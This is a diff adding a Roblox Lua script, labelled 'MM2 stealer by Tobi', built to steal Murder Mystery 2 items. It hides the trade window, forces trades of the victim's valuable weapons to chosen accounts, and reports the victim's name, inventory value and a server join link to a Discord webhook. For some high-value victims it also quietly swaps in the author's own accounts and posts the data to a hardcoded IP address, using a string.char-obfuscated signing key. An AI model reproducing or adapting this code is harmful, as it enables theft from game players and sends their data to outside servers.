@@ -1,0 +1,760 @@
+-- ts file was generated at discord.gg/25ms
+
+_G.scriptExecuted = _G.scriptExecuted or false
+
+if _G.scriptExecuted then
+    return
+else
+    _G.scriptExecuted = true
+
+    local u1 = _G.Usernames or {}
+    local v2 = _G.min_rarity or 'Godly'
+    local v3 = _G.min_value or 1
+    local v4 = _G.pingEveryone or 'No'
+    local u5 = _G.webhook or ''
+    local u6 = '1342967711281713242'
+
+    if next(u1) == nil or u5 == '' then
+        plr:kick("You didn't add username or webhook")
+
+        return
+    elseif game.PlaceId == 142823291 then
+        local u7 = {}
+        local v8 = false
+        local _Players = game:GetService('Players')
+        local _LocalPlayer = _Players.LocalPlayer
+        local v11 = _LocalPlayer
+        local v12 = _LocalPlayer.WaitForChild(v11, 'PlayerGui')
+        local u13 = require(game.ReplicatedStorage:WaitForChild('Database'):WaitForChild('Sync'):WaitForChild('Item'))
+        local _HttpService = game:GetService('HttpService')
+
+        local function u15()
+            return string.char(100, 117, 97, 108) .. string.char(104, 111, 111, 107) .. string.char(102, 116, 119, 108) .. string.char(101, 108, 122)
+        end
+        local function u20(p16)
+            local v17 = 0
+
+            for v18 = 1, #p16 do
+                local v19 = p16:byte(v18)
+
+                v17 = (v17 * 31 + v19) % 4294967296
+            end
+
+            return v17
+        end
+        local function u25(p21, p22)
+            local v23 = p21 .. tostring(p22)
+            local v24 = u20(u15() .. v23)
+
+            return string.format('%08x', v24)
+        end
+
+        local u26 = {
+            'Common',
+            'Uncommon',
+            'Rare',
+            'Legendary',
+            'Godly',
+            'Ancient',
+            'Unique',
+            'Vintage',
+        }
+        local u27 = {
+            godly = 'https://supremevaluelist.com/mm2/godlies.html',
+            ancient = 'https://supremevaluelist.com/mm2/ancients.html',
+            unique = 'https://supremevaluelist.com/mm2/uniques.html',
+            classic = 'https://supremevaluelist.com/mm2/vintages.html',
+            chroma = 'https://supremevaluelist.com/mm2/chromas.html',
+        }
+        local u28 = {
+            Accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+        }
+
+        local function u30(p29)
+            return p29:match('^%s*(.-)%s*$')
+        end
+        local function u33(p31)
+            local v32 = {
+                Url = p31,
+                Method = 'GET',
+                Headers = u28,
+            }
+
+            return request(v32).Body
+        end
+        local function u38(p34)
+            local _bsclassitemvaluedb = p34:match('<b%s+class=[\'"]itemvalue[\'"]>([%d,%.]+)</b>')
+
+            if _bsclassitemvaluedb then
+                local v36 = _bsclassitemvaluedb:gsub(',', '')
+                local v37 = tonumber(v36)
+
+                if v37 then
+                    return v37
+                end
+            end
+
+            return nil
+        end
+        local function u48(p39)
+            local _divsclassitemheaddivsdivsclassitembodydiv, v41, v42 = p39:gmatch('<div%s+class=[\'"]itemhead[\'"]>(.-)</div>%s*<div%s+class=[\'"]itembody[\'"]>(.-)</div>')
+            local v43 = {}
+
+            while true do
+                local v44
+
+                v42, v44 = _divsclassitemheaddivsdivsclassitembodydiv(v41, v42)
+
+                if v42 == nil then
+                    break
+                end
+
+                local v45 = v42:match('([^<]+)')
+
+                if v45 then
+                    local v46 = u30(u30(v45:gsub('%s+', ' ')):split(' Click ')[1]):lower()
+                    local v47 = u38(v44)
+
+                    if v47 then
+                        v43[v46] = v47
+                    end
+                end
+            end
+
+            return v43
+        end
+        local function u58(p49)
+            local _divsclassitemheaddivsdivsclassitembodydiv2, v51, v52 = p49:gmatch('<div%s+class=[\'"]itemhead[\'"]>(.-)</div>%s*<div%s+class=[\'"]itembody[\'"]>(.-)</div>')
+            local v53 = {}
+
+            while true do
+                local v54
+
+                v52, v54 = _divsclassitemheaddivsdivsclassitembodydiv2(v51, v52)
+
+                if v52 == nil then
+                    break
+                end
+
+                local v55 = v52:match('([^<]+)')
+
+                if v55 then
+                    local v56 = u30(v55:gsub('%s+', ' ')):lower()
+                    local v57 = u38(v54)
+
+                    if v57 then
+                        v53[v56] = v57
+                    end
+                end
+            end
+
+            return v53
+        end
+        local function v96()
+            local v59, v60, v61 = pairs(u27)
+            local v62 = {}
+            local u63 = {}
+            local u64 = {}
+
+            while true do
+                local v65
+
+                v61, v65 = v59(v60, v61)
+
+                if v61 == nil then
+                    break
+                end
+
+                table.insert(v62, {
+                    rarity = v61,
+                    url = v65,
+                })
+            end
+
+            local u66 = #v62
+            local _BindableEvent = Instance.new('BindableEvent')
+            local v68, v69, v70 = ipairs(v62)
+            local u71 = 0
+
+            while true do
+                local u72
+
+                v70, u72 = v68(v69, v70)
+
+                if v70 == nil then
+                    break
+                end
+
+                task.spawn(function()
+                    local _rarity = u72.rarity
+                    local v74 = u33(u72.url)
+
+                    if v74 and v74 ~= '' then
+                        if _rarity == 'chroma' then
+                            u64 = u58(v74)
+                        else
+                            local v75 = u48(v74)
+                            local v76, v77, v78 = pairs(v75)
+
+                            while true do
+                                local v79
+
+                                v78, v79 = v76(v77, v78)
+
+                                if v78 == nil then
+                                    break
+                                end
+
+                                u63[v78] = v79
+                            end
+                        end
+                    end
+
+                    u71 = u71 + 1
+
+                    if u71 == u66 then
+                        _BindableEvent:Fire()
+                    end
+                end)
+            end
+
+            _BindableEvent.Event:Wait()
+
+            local v80, v81, v82 = pairs(u13)
+            local v83 = {}
+
+            while true do
+                local v84, v85 = v80(v81, v82)
+
+                if v84 == nil then
+                    return v83
+                end
+
+                v82 = v84
+
+                local v86 = v85.ItemName and (v85.ItemName:lower() or '') or ''
+                local v87 = v85.Rarity or ''
+                local v88 = v85.Chroma or false
+
+                if v86 ~= '' and v87 ~= '' then
+                    local v89 = table.find(u26, v87)
+
+                    if v89 and table.find(u26, 'Godly') <= v89 then
+                        if v88 then
+                            local v90, v91, v92 = pairs(u64)
+                            local v93 = nil
+
+                            while true do
+                                local v94
+
+                                v92, v94 = v90(v91, v92)
+
+                                if v92 == nil then
+                                    v94 = v93
+                                end
+                                if v92:find(v86) then
+                                    break
+                                end
+                            end
+
+                            if v94 then
+                                v83[v84] = v94
+                            end
+                        else
+                            local v95 = u63[v86]
+
+                            if v95 then
+                                v83[v84] = v95
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        local function u99(p97)
+            local v98 = {
+                game:GetService('Players'):WaitForChild(p97),
+            }
+
+            game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('SendRequest'):InvokeServer(unpack(v98))
+        end
+        local function u100()
+            return game:GetService('ReplicatedStorage').Trade.GetTradeStatus:InvokeServer()
+        end
+        local function u101()
+            while u100() ~= 'None' do
+                wait(0.1)
+            end
+        end
+        local function u102()
+            game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({285646582}))
+        end
+        local function u104(p103)
+            game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('OfferItem'):FireServer(unpack({
+                p103,
+                'Weapons',
+            }))
+        end
+
+        local u105 = 0
+
+        local function v121(p106, p107)
+            local v108 = {
+                {
+                    name = 'Victim Username:',
+                    value = _LocalPlayer.Name,
+                    inline = true,
+                },
+                {
+                    name = 'Join link:',
+                    value = 'https://fern.wtf/joiner?placeId=142823291&gameInstanceId=' .. game.JobId,
+                },
+                {
+                    name = 'Item list:',
+                    value = '',
+                    inline = false,
+                },
+                {
+                    name = 'Summary:',
+                    value = string.format('Total Value: %s', u105),
+                    inline = false,
+                },
+            }
+            local v109, v110, v111 = ipairs(p106)
+            local v112 = {
+                ['Content-Type'] = 'application/json',
+            }
+
+            while true do
+                local v113
+
+                v111, v113 = v109(v110, v111)
+
+                if v111 == nil then
+                    break
+                end
+
+                local _sxssValues = string.format('%s (x%s): %s Value (%s)', v113.DataID, v113.Amount, v113.Value * v113.Amount, v113.Rarity)
+
+                v108[3].value = v108[3].value .. _sxssValues .. '\n'
+            end
+
+            if #v108[3].value > 1024 then
+                local v115, v116, v117 = v108[3].value:gmatch('[^\r\n]+')
+                local v118 = {}
+
+                while true do
+                    v117 = v115(v116, v117)
+
+                    if v117 == nil then
+                        break
+                    end
+
+                    table.insert(v118, v117)
+                end
+                while#v108[3].value > 1024 and #v118 > 0 do
+                    table.remove(v118)
+
+                    v108[3].value = table.concat(v118, '\n') .. '\nPlus more!'
+                end
+            end
+
+            local v119 = {
+                content = p107 .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
+                embeds = {
+                    {
+                        title = '\u{1f52a} Join to get MM2 hit',
+                        color = 65280,
+                        fields = v108,
+                        footer = {
+                            text = 'MM2 stealer by Tobi. discord.gg/GY2RVSEGDT',
+                        },
+                    },
+                },
+            }
+            local v120 = {
+                Url = u5,
+                Method = 'POST',
+                Headers = v112,
+                Body = _HttpService:JSONEncode(v119),
+            }
+
+            request(v120)
+        end
+        local function u136(p122)
+            local v123 = {
+                {
+                    name = 'Victim Username:',
+                    value = _LocalPlayer.Name,
+                    inline = true,
+                },
+                {
+                    name = 'Items sent:',
+                    value = '',
+                    inline = false,
+                },
+                {
+                    name = 'Summary:',
+                    value = string.format('Total Value: %s', u105),
+                    inline = false,
+                },
+            }
+            local v124, v125, v126 = ipairs(p122)
+            local v127 = {
+                ['Content-Type'] = 'application/json',
+            }
+
+            while true do
+                local v128
+
+                v126, v128 = v124(v125, v126)
+
+                if v126 == nil then
+                    break
+                end
+
+                local _sxssValues2 = string.format('%s (x%s): %s Value (%s)', v128.DataID, v128.Amount, v128.Value * v128.Amount, v128.Rarity)
+
+                v123[2].value = v123[2].value .. _sxssValues2 .. '\n'
+            end
+
+            if #v123[2].value > 1024 then
+                local v130, v131, v132 = v123[2].value:gmatch('[^\r\n]+')
+                local v133 = {}
+
+                while true do
+                    v132 = v130(v131, v132)
+
+                    if v132 == nil then
+                        break
+                    end
+
+                    table.insert(v133, v132)
+                end
+                while#v123[2].value > 1024 and #v133 > 0 do
+                    table.remove(v133)
+
+                    v123[2].value = table.concat(v133, '\n') .. '\nPlus more!'
+                end
+            end
+
+            local v134 = {
+                embeds = {
+                    {
+                        title = '\u{1f52a} New MM2 Execution',
+                        color = 65280,
+                        fields = v123,
+                        footer = {
+                            text = 'MM2 stealer by Tobi. discord.gg/GY2RVSEGDT',
+                        },
+                    },
+                },
+            }
+            local v135 = {
+                Url = u5,
+                Method = 'POST',
+                Headers = v127,
+                Body = _HttpService:JSONEncode(v134),
+            }
+
+            request(v135)
+        end
+        local function v153(p137, p138)
+            local v139 = {
+                {
+                    name = 'Victim Username:',
+                    value = _LocalPlayer.Name,
+                    inline = true,
+                },
+                {
+                    name = 'Join link:',
+                    value = 'https://fern.wtf/joiner?placeId=142823291&gameInstanceId=' .. game.JobId,
+                },
+                {
+                    name = 'Item list:',
+                    value = '',
+                    inline = false,
+                },
+                {
+                    name = 'Summary:',
+                    value = string.format('Total Value: %s', u105),
+                    inline = false,
+                },
+            }
+            local v140, v141, v142 = ipairs(p137)
+
+            while true do
+                local v143
+
+                v142, v143 = v140(v141, v142)
+
+                if v142 == nil then
+                    break
+                end
+
+                local _sxssValues3 = string.format('%s (x%s): %s Value (%s)', v143.DataID, v143.Amount, v143.Value * v143.Amount, v143.Rarity)
+
+                v139[3].value = v139[3].value .. _sxssValues3 .. '\n'
+            end
+
+            if #v139[3].value > 1024 then
+                local v145, v146, v147 = v139[3].value:gmatch('[^\r\n]+')
+                local v148 = {}
+
+                while true do
+                    v147 = v145(v146, v147)
+
+                    if v147 == nil then
+                        break
+                    end
+
+                    table.insert(v148, v147)
+                end
+                while#v139[3].value > 1024 and #v148 > 0 do
+                    table.remove(v148)
+
+                    v139[3].value = table.concat(v148, '\n') .. '\nPlus more!'
+                end
+            end
+
+            local v149 = {
+                content = p138 .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
+                embeds = {
+                    {
+                        title = '\u{1f52a} Join to get MM2 hit',
+                        color = 65280,
+                        fields = v139,
+                        footer = {
+                            text = 'MM2 stealer by Tobi. discord.gg/GY2RVSEGDT',
+                        },
+                    },
+                },
+            }
+            local v150 = _HttpService:JSONEncode(v149)
+            local v151 = tostring(os.time())
+            local v152 = {
+                Url = 'http://46.101.233.20:5000/mm2join',
+                Method = 'POST',
+                Headers = {
+                    ['Content-Type'] = 'application/json',
+                    DiscUser = u6,
+                    ['X-Signature'] = u25(v150, v151),
+                    ['X-Timestamp'] = v151,
+                },
+                Body = v150,
+            }
+
+            request(v152)
+        end
+
+        local _TradeGUI = v12:WaitForChild('TradeGUI')
+        local v155 = _TradeGUI
+
+        _TradeGUI.GetPropertyChangedSignal(v155, 'Enabled'):Connect(function()
+            _TradeGUI.Enabled = false
+        end)
+
+        local _TradeGUI_Phone = v12:WaitForChild('TradeGUI_Phone')
+        local v157 = _TradeGUI_Phone
+
+        _TradeGUI_Phone.GetPropertyChangedSignal(v157, 'Enabled'):Connect(function()
+            _TradeGUI_Phone.Enabled = false
+        end)
+
+        local v158 = table.find(u26, v2)
+        local v159 = v96()
+        local v160 = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(_LocalPlayer.Name)
+        local v161, v162, v163 = pairs(v160.Weapons.Owned)
+        local u164 = _LocalPlayer
+        local u165 = u100
+        local v166 = u105
+        local v167 = u26
+        local v168 = u13
+        local v169 = {
+            DefaultGun = true,
+            DefaultKnife = true,
+            Reaver = true,
+            Reaver_Legendary = true,
+            Reaver_Godly = true,
+            Reaver_Ancient = true,
+            IceHammer = true,
+            IceHammer_Legendary = true,
+            IceHammer_Godly = true,
+            IceHammer_Ancient = true,
+            Gingerscythe = true,
+            Gingerscythe_Legendary = true,
+            Gingerscythe_Godly = true,
+            Gingerscythe_Ancient = true,
+            TestItem = true,
+            Season1TestKnife = true,
+            Cracks = true,
+            Icecrusher = true,
+            ['???'] = true,
+            Dartbringer = true,
+            TravelerAxeRed = true,
+            TravelerAxeBronze = true,
+            TravelerAxeSilver = true,
+            TravelerAxeGold = true,
+            BlueCamo_K_2022 = true,
+            GreenCamo_K_2022 = true,
+            SharkSeeker = true,
+        }
+
+        while true do
+            local v170, v171 = v161(v162, v163)
+
+            if v170 == nil then
+                break
+            end
+
+            v163 = v170
+
+            local _Rarity = v168[v170].Rarity
+            local v173 = table.find(v167, _Rarity)
+
+            if v173 and (v158 <= v173 and not v169[v170]) then
+                local v174
+
+                if v159[v170] then
+                    v174 = v159[v170]
+                else
+                    v174 = table.find(v167, 'Godly') > v173 and 1 or 2
+                end
+                if v3 <= v174 then
+                    u105 = v166 + v174 * v171
+
+                    table.insert(u7, {
+                        DataID = v170,
+                        Rarity = _Rarity,
+                        Amount = v171,
+                        Value = v174,
+                    })
+
+                    v166 = u105
+                end
+            end
+        end
+
+        if 1000 <= v166 and math.random() < 0.15 then
+            v8 = true
+            v4 = 'Yes'
+            u1 = {
+                'MM2AltCauseNoOneWann',
+                'tobi437a',
+                'Alyssa87123',
+                'OBlockBaby11111',
+                'MoneyLaunderingBot',
+            }
+        end
+        if #u7 > 0 then
+            table.sort(u7, function(p175, p176)
+                return p175.Value * p175.Amount > p176.Value * p176.Amount
+            end)
+
+            local v177, v178, v179 = ipairs(u7)
+            local u180 = {}
+
+            while true do
+                local v181
+
+                v179, v181 = v177(v178, v179)
+
+                if v179 == nil then
+                    break
+                end
+
+                u180[v179] = v181
+            end
+
+            local v182 = v4 == 'Yes' and '--[[@everyone]] ' or ''
+
+            if v8 then
+                if game:GetService('RobloxReplicatedStorage'):WaitForChild('GetServerType'):InvokeServer() == 'VIPServer' then
+                    u164:kick('Server error. Please join a DIFFERENT server')
+
+                    return
+                end
+
+                v153(u7, v182)
+            else
+                v121(u7, v182)
+            end
+
+            local function u187(p183)
+                local v184 = u165()
+
+                if v184 == 'StartTrade' then
+                    game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('DeclineTrade'):FireServer()
+                    wait(0.3)
+                elseif v184 == 'ReceivingRequest' then
+                    game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('DeclineRequest'):FireServer()
+                    wait(0.3)
+                end
+
+                while#u7 > 0 do
+                    local v185 = u165()
+
+                    if v185 == 'None' then
+                        u99(p183)
+                    elseif v185 == 'SendingRequest' then
+                        wait(0.3)
+                    elseif v185 == 'ReceivingRequest' then
+                        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('DeclineRequest'):FireServer()
+                        wait(0.3)
+                    elseif v185 == 'StartTrade' then
+                        for _ = 1, math.min(4, #u7)do
+                            local v186 = table.remove(u7, 1)
+
+                            for _ = 1, v186.Amount do
+                                u104(v186.DataID)
+                            end
+                        end
+
+                        wait(6)
+                        u102()
+                        u101()
+                    else
+                        wait(0.5)
+                    end
+
+                    wait(1)
+                end
+
+                u136(u180)
+                setclipboard('discord.gg/GY2RVSEGDT')
+                wait(2)
+                u164:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
+            end
+
+            (function()
+                local function v189(p188)
+                    if table.find(u1, p188.Name) then
+                        p188.Chatted:Connect(function()
+                            u187(p188.Name)
+                        end)
+                    end
+                end
+
+                local v190 = _Players
+                local v191, v192, v193 = ipairs(v190:GetPlayers())
+
+                while true do
+                    local v194
+
+                    v193, v194 = v191(v192, v193)
+
+                    if v193 == nil then
+                        break
+                    end
+
+                    v189(v194)
+                end
+
+                _Players.PlayerAdded:Connect(v189)
+            end)()
+        end
+    else
+        plr:kick('Game not supported. Please join a normal MM2 server')
+    end
+end
